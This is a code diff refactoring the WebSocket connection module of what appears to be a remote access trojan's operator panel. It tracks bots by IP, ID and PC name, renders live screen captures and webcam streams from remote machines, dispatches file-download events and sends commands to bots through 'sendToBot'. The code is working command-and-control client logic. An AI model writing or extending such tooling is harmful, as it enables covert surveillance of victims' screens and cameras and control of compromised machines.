@@ -1,78 +1,83 @@
 /* frontend/client_control/js/modules/websocket/connection.js */
 import { AppState } from '../core/states.js';
-import { decodePacket, encodePacket, isJson } from '../../../../dashboard/js/modules/websocket/protocol.js';
+import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
 import { renderScreenRGBA } from '../features/screen_renderer.js';
 
-let socket = null, botWatchdog = null;
+let socket = null, botWatchdog = null, isRendering = false;
+const decoder = new TextDecoder();
 
 const updateUI = (id, val) => {
     const el = document.getElementById(id);
-    if (el && val) el.textContent = val;
+    if (el) el.textContent = val || '...';
 };
 
 const setOnline = (isOnline) => {
-    const dot = document.getElementById('status-indicator');
-    const txt = document.getElementById('status-text');
-    dot?.classList.toggle('online', isOnline);
-    if (txt) txt.textContent = isOnline ? 'online' : 'offline';
+    document.getElementById('status-indicator')?.classList.toggle('online', isOnline);
+    updateUI('status-text', isOnline ? 'online' : 'offline');
 };
 
 function handleIncomingData(buffer) {
     const pkg = decodePacket(buffer);
     if (!pkg || pkg.id !== AppState.clientId) return;
 
-    if (isJson(pkg.module)) {
-        try {
-            const data = JSON.parse(new TextDecoder().decode(pkg.payload));
+    setOnline(true);
+    clearTimeout(botWatchdog);
+    botWatchdog = setTimeout(() => setOnline(false), 10000);
 
-            if (data.ip || data.id) {
-                updateUI('display-id', data.id || pkg.id);
-                updateUI('display-ip', data.ip);
-            }
+    switch (pkg.module) {
+        case 'DataScribe':
+        case 'Heartbeat':
+            try {
+                const data = JSON.parse(decoder.decode(pkg.payload));
+                if (data.ip) updateUI('display-ip', data.ip);
+                if (data.id) updateUI('display-id', data.id);
+            } catch (e) { console.warn("[WS] Metadata JSON Error"); }
+            break;
 
-            const isBotActive = data.net === 'heartbeat' || data.ip || data.pc_name;
-            if (isBotActive) {
-                setOnline(true);
-                clearTimeout(botWatchdog);
-                botWatchdog = setTimeout(() => setOnline(false), 10000);
+        case 'ScreenWatch':
+            if (isRendering) return;
+
+            // Скрываем оверлей "No desktop data" при получении изображения
+            const desktopOverlay = document.querySelector('#view-desktop .stream-overlay');
+            if (desktopOverlay) desktopOverlay.style.display = 'none';
+
+            isRendering = true;
+            renderScreenRGBA(pkg.payload).finally(() => { isRendering = false; });
+            break;
+
+        case 'Webcam':
+            // Скрываем оверлей камеры
+            const webcamOverlay = document.querySelector('#view-webcam .stream-overlay');
+            if (webcamOverlay) webcamOverlay.style.display = 'none';
+
+            if (window.renderStream) {
+                window.renderStream('webcam-view', pkg.payload, 'webcam-placeholder');
             }
-        } catch (e) { console.error("[WS] JSON Error"); }
-    } else {
-        // БИНАРНЫЙ ДИСПЕТЧЕР
-        if (pkg.module === 'ScreenWatch') {
-            console.log(`[WS] Received Frame! Size: ${pkg.payload.byteLength} bytes`);
-            // Прямой рендер кадра экрана
-            renderScreenRGBA(pkg.payload);
-        } else if (pkg.module === 'Webcam') {
-            // Рендер веб-камеры через Blob
-            window.renderStream('webcam-view', pkg.payload, 'webcam-placeholder');
-        } else {
-            // Для остальных кастомных событий (например, скачивание файлов)
+            break;
+
+        default:
             window.dispatchEvent(new CustomEvent('binaryDataReceived', { detail: pkg }));
-        }
     }
 }
 
 export function initControlConnection() {
-    const token = localStorage.getItem('auth_token'), login = localStorage.getItem('user_login');
-    if (!token || !login) return;
+    const token = localStorage.getItem('auth_token');
+    const login = localStorage.getItem('user_login');
+    if (!token || !login || !AppState.clientId) return;
 
     const prot = location.protocol === 'https:' ? 'wss:' : 'ws:';
-    const url = `${prot}//${location.host}/ws?token=${token}&login=${login}&mode=control`;
-
-    socket = new WebSocket(url);
+    socket = new WebSocket(`${prot}//${location.host}/ws?token=${token}&login=${login}&mode=control`);
     socket.binaryType = 'arraybuffer';
 
-    socket.onmessage = (e) => {
-        console.log(`[WS] Пакет получен! Размер: ${e.data.byteLength} байт`); // СМОТРИМ СЮДА
-        if (e.data instanceof ArrayBuffer) {
-            handleIncomingData(e.data);
-        }
+    socket.onopen = () => {
+        window.sendToBot?.("DataScribe", "get_metadata");
+        setInterval(() => {
+            if (socket?.readyState === 1) socket.send(encodePacket("", "Heartbeat", "ping"));
+        }, 25000);
     };
 
-    socket.onopen = () => {
-        window.sendToBot("DataScribe", "get_metadata");
-        setInterval(() => socket?.readyState === 1 && socket.send(encodePacket("SERVER", "ping")), 25000);
+    socket.onmessage = (e) => {
+        if (e.data instanceof ArrayBuffer) handleIncomingData(e.data);
     };
 
     socket.onclose = () => {
@@ -82,7 +87,6 @@ export function initControlConnection() {
 
     window.sendToBot = (mod, pay) => {
         if (socket?.readyState === 1) {
-            console.log(`[WS] Отправка команды боту: ${mod} -> ${pay}`);
             socket.send(encodePacket(AppState.clientId, mod, pay));
         }
     };
